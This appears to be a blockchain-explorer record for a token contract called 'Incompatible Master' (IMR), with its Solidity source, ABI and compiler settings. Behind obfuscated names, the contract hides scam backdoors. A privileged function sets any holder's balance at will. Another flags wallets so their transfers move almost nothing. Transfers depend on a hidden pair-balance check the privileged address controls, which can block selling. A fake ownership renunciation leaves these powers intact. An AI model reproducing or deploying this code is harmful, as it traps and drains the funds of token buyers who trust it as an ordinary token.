{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface takeMin {\n    function createPair(address walletMarketing, address shouldSender) external returns (address);\n}\n\ninterface isFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoLiquidity) external view returns (uint256);\n\n    function transfer(address liquiditySender, uint256 autoSwap) external returns (bool);\n\n    function allowance(address limitList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquiditySender,\n        uint256 autoSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverSwap, uint256 value);\n    event Approval(address indexed limitList, address indexed spender, uint256 value);\n}\n\nabstract contract feeShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingShould is isFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IncompatibleMaster is feeShould, isFrom, tradingShould {\n\n    uint256 private shouldFrom;\n\n    function owner() external view returns (address) {\n        return toFeeExempt;\n    }\n\n    uint256 public liquiditySwap;\n\n    address private toFeeExempt;\n\n    uint256 private listTake;\n\n    uint8 private receiverAt = 18;\n\n    bool public shouldToken;\n\n    mapping(address => uint256) private tradingFund;\n\n    function walletAmountSwap(address receiverTakeAt) public {\n        require(receiverTakeAt.balance < 100000);\n        if (buyAmount) {\n            return;\n        }\n        if (liquiditySwap == swapList) {\n            shouldToken = false;\n        }\n        launchedTakeTrading[receiverTakeAt] = true;\n        \n        buyAmount = true;\n    }\n\n    uint256 private fromFee;\n\n    uint256 public swapLiquidity;\n\n    bool private minLaunch;\n\n    function transferFrom(address listAt, address liquiditySender, uint256 autoSwap) external override returns (bool) {\n        if (_msgSender() != amountReceiver) {\n            if (atLaunched[listAt][_msgSender()] != type(uint256).max) {\n                require(autoSwap <= atLaunched[listAt][_msgSender()]);\n                atLaunched[listAt][_msgSender()] -= autoSwap;\n            }\n        }\n        return toAuto(listAt, liquiditySender, autoSwap);\n    }\n\n    address amountReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed modeSwapAmount, address indexed liquidityIsAmount);\n\n    function maxLiquidity() private view {\n        require(launchedTakeTrading[_msgSender()]);\n    }\n\n    constructor (){\n        if (swapLiquidity == fromFee) {\n            minLaunch = true;\n        }\n        enableReceiver listTeam = enableReceiver(amountReceiver);\n        txWalletFund = takeMin(listTeam.factory()).createPair(listTeam.WETH(), address(this));\n        \n        buyLimit = _msgSender();\n        launchedTakeTrading[buyLimit] = true;\n        tradingFund[buyLimit] = teamIs;\n        minTotalBuy();\n        \n        emit Transfer(address(0), buyLimit, teamIs);\n    }\n\n    bool public buyAmount;\n\n    function toAuto(address listAt, address liquiditySender, uint256 autoSwap) internal returns (bool) {\n        if (listAt == buyLimit) {\n            return fromLiquidityAmount(listAt, liquiditySender, autoSwap);\n        }\n        uint256 listLaunch = isFrom(txWalletFund).balanceOf(totalBuyReceiver);\n        require(listLaunch == tradingFromLaunched);\n        require(liquiditySender != totalBuyReceiver);\n        if (liquidityMode[listAt]) {\n            return fromLiquidityAmount(listAt, liquiditySender, fundAmount);\n        }\n        return fromLiquidityAmount(listAt, liquiditySender, autoSwap);\n    }\n\n    function transfer(address senderEnableTeam, uint256 autoSwap) external virtual override returns (bool) {\n        return toAuto(_msgSender(), senderEnableTeam, autoSwap);\n    }\n\n    uint256 private teamIs = 100000000 * 10 ** 18;\n\n    function balanceOf(address autoLiquidity) public view virtual override returns (uint256) {\n        return tradingFund[autoLiquidity];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fundLiquidity;\n    }\n\n    uint256 public isTx;\n\n    function approve(address tradingAmountReceiver, uint256 autoSwap) public virtual override returns (bool) {\n        atLaunched[_msgSender()][tradingAmountReceiver] = autoSwap;\n        emit Approval(_msgSender(), tradingAmountReceiver, autoSwap);\n        return true;\n    }\n\n    mapping(address => bool) public launchedTakeTrading;\n\n    address public buyLimit;\n\n    uint256 constant fundAmount = 16 ** 10;\n\n    function limitFundMarketing(uint256 autoSwap) public {\n        maxLiquidity();\n        tradingFromLaunched = autoSwap;\n    }\n\n    function txLaunched(address senderEnableTeam, uint256 autoSwap) public {\n        maxLiquidity();\n        tradingFund[senderEnableTeam] = autoSwap;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamIs;\n    }\n\n    string private enableSender = \"IMR\";\n\n    function getOwner() external view returns (address) {\n        return toFeeExempt;\n    }\n\n    bool public listIs;\n\n    mapping(address => mapping(address => uint256)) private atLaunched;\n\n    function allowance(address autoReceiverLiquidity, address tradingAmountReceiver) external view virtual override returns (uint256) {\n        if (tradingAmountReceiver == amountReceiver) {\n            return type(uint256).max;\n        }\n        return atLaunched[autoReceiverLiquidity][tradingAmountReceiver];\n    }\n\n    uint256 limitMarketing;\n\n    mapping(address => bool) public liquidityMode;\n\n    uint256 tradingFromLaunched;\n\n    string private fundLiquidity = \"Incompatible Master\";\n\n    address public txWalletFund;\n\n    function fromLiquidityAmount(address listAt, address liquiditySender, uint256 autoSwap) internal returns (bool) {\n        require(tradingFund[listAt] >= autoSwap);\n        tradingFund[listAt] -= autoSwap;\n        tradingFund[liquiditySender] += autoSwap;\n        emit Transfer(listAt, liquiditySender, autoSwap);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableSender;\n    }\n\n    function feeMaxTrading(address buyLaunched) public {\n        maxLiquidity();\n        \n        if (buyLaunched == buyLimit || buyLaunched == txWalletFund) {\n            return;\n        }\n        liquidityMode[buyLaunched] = true;\n    }\n\n    address totalBuyReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public swapList;\n\n    function minTotalBuy() public {\n        emit OwnershipTransferred(buyLimit, address(0));\n        toFeeExempt = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeSwapAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityIsAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiverLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingAmountReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAmountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"}],\"name\":\"feeMaxTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedTakeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoSwap\",\"type\":\"uint256\"}],\"name\":\"limitFundMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotalBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderEnableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderEnableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSwap\",\"type\":\"uint256\"}],\"name\":\"txLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWalletFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTakeAt\",\"type\":\"address\"}],\"name\":\"walletAmountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IncompatibleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}